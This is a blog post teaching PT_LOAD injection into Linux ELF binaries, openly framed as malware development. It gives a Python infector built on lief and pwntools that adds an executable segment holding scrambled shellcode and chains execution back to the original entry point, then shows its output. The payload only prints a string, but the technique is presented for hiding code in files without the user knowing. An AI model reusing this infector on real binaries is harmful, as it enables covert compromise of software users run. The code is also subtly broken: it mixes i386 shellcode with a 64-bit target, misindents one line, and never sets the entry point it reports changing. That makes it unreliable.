---
layout: post
title: PT_load Injection 
date: 2022-12-16 13:20:14 +0300
description: Understanding PT_load
author: Ahmet Göker - @0xCD4
comments: true
tags: [Coding, Python, ELF, Linux, EN]
---



# PT_load injection 

Hey everyone welcome back to my blog about PT_load injection. Today I want iilustrate
what I did code to change the entry point of the file. First of all, let me shortly introduce about what ELF is. 

I am not going to cover in details, but kind of information would be superb.

## ELF file

ELF is the abbreviation for executable and linkable format and defines the structre for binaries, libraries.

You might be familiar with PE executable of windows but this in the form of Linux OS.

without libraries, binaries the file will not be able to run properly because some of them shall be missing. The goal is that we can inject our evil code into such files, kind of malware which can be run without knowing that the file had been infected.

Linux has a great command called *readelf* which can help us to identify the anatomy of the file

Structures are:
```
- ELF  header
- File data
```

We are interested in ELF header which should help to inject our shellcode into the file.

Let me use readelf command to understand the anatomy. 

Its important what you are looking for. For instance, we will be concerning on header of this file.

You can use this command to view the header  *readelf -e [file]*


```

  Entry point address:               0x1060
  Start of program headers:          64 (bytes into file)
  Start of section headers:          13976 (bytes into file)
  Flags:                             0x0



  LOAD           0x0000000000000000 0x0000000000000000  0x0000000000000000
                 0x0000000000000628 0x0000000000000628  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x0000000000000175 0x0000000000000175  R E    0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                 0x00000000000000f4 0x00000000000000f4  R      0x1000
  LOAD           0x0000000000002db8 0x0000000000003db8 0x0000000000003db8
                 0x0000000000000258 0x0000000000000260  RW     0x1000

Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 
   03     .init .plt .plt.got .plt.sec .text .fini 
   04     .rodata .eh_frame_hdr .eh_frame 
   05     .init_array .fini_array .dynamic .got .data .bss 
   06     .dynamic 
   07     .note.gnu.property 
   08     .note.gnu.build-id .note.ABI-tag 
   09     .note.gnu.property 
   10     .eh_frame_hdr 
   11     
   12     .init_array .fini_array .dynamic .got


```

Oke, I will be using the documenation from oracle


### Object Files in Executable and Linking Format

Relocatable ELF files produced by the assembler consist of:

    An ELF header

    A section header table

    Sections

The ELF header is always the first part of an ELF file. It is a structure of fixed size and format. The fields, or members, of the structure describe the nature, organization and contents of the rest of the file. The ELF header has a field that specifies the location within the file where the section header table begins.

The section header table is an array of section headers that are structures of fixed size and format. The section headers are the elements of the array, or the entries in the table. The section header table has one entry for each section in the ELF file. However, the table can also have entries (section headers) that do not correspond to any section in the file. Such entries and their array indices are reserved. The members of each section header constitute information useful to the linker about the contents of the corresponding section, if any.


We understand from this documentation that ELF files always starts by  ELF header which should be important for us to create a shellcode to be injected.


Let me explain step by step what you should do before coding maliciously.


# PT_load

This header is one of the most important header type. It defines how a portion of the file must be placed in the memory. This will be a good choice to infect the pt_load header type to inject the our malicious code.

You also need to understand the attributes of this header type. We are interested in:

p_filesz = the size of the segment in the file

p_memsz = this size of the segment in the memory

p_flags = the permission flags (x,r,e)



Let's create our algorithm to create our shellcode to be injected.

## Algorithm of pt_load injection 

We will use two powerful libraries:

- lief
- pwntools 

You can check these libraries in your free time.


1. We need to parse the file to get into the entrypoint.

2. When this step is done, we shall create a new load segment

3. After creating; u can create your shellcode into that new segment

4. after injecting; do not forget to patch the binary. 

5. In order to trace the target, you can add the old entry point to the malicious to be hidden (your choice) but tracing 
anonymously will be useful.

6. when the fifth is done, save the binary as output.




## Creating the devil code


```python 

def infect(file, output):
    prGreen("[+] It has been infected")
    payload   = "dangerous is coming\n"
    evilfile  = lief.parse(file)
    devilcode = asm("mov esi, edx")   # edx will stored to the esi (file)
    devilcode += asm(pwnlib.shellcraft.i386.write(1, payload, len(payload)))
    devilcode =  pwnlib.encoders.encoder.scramble(devilcode) 
    hex_ = hex(evilfile.header.entrypoint)
    devilcode += asm(f"mov esi, edx; push {hex_}; ret")
    print("devilcode size : " ,len(devilcode))
		print(f"payload {devilcode}")                   
    # ------------------------------------------------------------------------------------------
    
    segment = lief.ELF.Segment() 
    segment.type =  lief.ELF.SEGMENT_TYPES.LOAD 
    segment.flags = lief.ELF.SEGMENT_FLAGS.X                        
    segment.content = bytearray(devilcode)                          
    segment.alignment = 0x1234                                     #segment alignment in memory.
    evilfile.add(segment)


```


1. I have not included reverse shell, but a normal string
2. As I said, we need to parse the file with the help of lief library
3. I have used asm() from pwn to convert to byte 
4. We are storing our payloud to devilcode variable 
5. I encoded my payload (optional)
6. we need to push the entrypoint as byterarray to our devilcode thus adding 
7. print the size of devilcode

you can check this:  [lief](https://lief-project.github.io/doc/latest/api/python/elf.html)

segments must be included (runtime) 


### The output of the code

```
spyware@virus:~/malware-dev$ python3 ELf_inject.py -f test -o e
 [+] It has been infected
devilcode size :  110
payload, b'\xd9\xd0\xfc\xd9t$\xf4^\x83\xc6\x18\x89\xf7\xac\x93\xac(\xd8\xaa\x80\xeb\xacu\xf5U\xde\xb8\x8e\xe8P67VW\x1c\x1d\xc6\xc7f\xe7\xe9\x1d\x08,/\xa1\x1a%op\xab\xac"\x8a\x9e\x03\xf7ij\xd9a\xd6\xbe&\xa7\x0b\xb5\x16L\xba9\xa0?\xc8\xbc\x9d\'\x91\xde\xdf\xcf*\xc71\x03\x0c\x1fy\xa5\xe7\x1c\x86\xda\xde9\x91p=&\xa6\xacx\x89\xd6h`\x10\x00\x00\xc3'
 [+] Segment has been linked to the file
The orginal entrypoint:  0x2060
New entrypoint:  0xd000

```


Let me check the infected file:

```
  LOAD           0x0000000000003db8 0x0000000000004db8 0x0000000000004db8
                 0x0000000000000258 0x0000000000000260  RW     0x1000
  LOAD           0x0000000000005000 0x000000000000d000 0x000000000000d000
                 0x0000000000000070 0x0000000000000070    E    0x1234     <---- infected
  LOAD           0x0000000000006000 0x0000000000016000 0x0000000000016000
                 0x0000000000000080 0x0000000000000080  R      0x1000

	Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0xd000   <----- changed
  Start of program headers:          64 (bytes into file)

```

#### Conclusion 

You can build more advanced features into your code. I just wanted to enhance my skills to show that its not so hard to think how such malwares have been created in the cyber world

If you have some doubts to understand this technique you can always ask to me.

Stay tuned for more blogs.

Check this article: [elf-static-injection-to-load-malicious-dynamic-link-library](https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/)






